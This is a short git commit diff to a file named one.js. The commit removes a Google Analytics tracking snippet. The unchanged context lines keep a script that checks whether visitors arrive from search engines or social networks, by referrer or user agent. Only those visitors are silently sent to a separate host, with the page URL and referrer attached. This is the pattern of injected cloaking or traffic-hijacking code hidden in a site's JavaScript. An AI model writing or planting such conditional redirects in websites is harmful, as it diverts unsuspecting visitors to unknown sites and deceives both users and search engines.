32f53cc8150282198f0612322b0fa9ea5ff5074d
mychiara <85479169+mychiara@users.noreply.github.com>
2022-03-30 09:54:57 +0800

    Update one.js

--- one.js
+++ one.js
@@ -27,15 +27,4 @@ type='text/javascript'>
 	//Code arsae client javascript
 	if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
     }
-
-//
-<!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-VWT8XY3VWX"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-VWT8XY3VWX');
-</script>
 //]]>
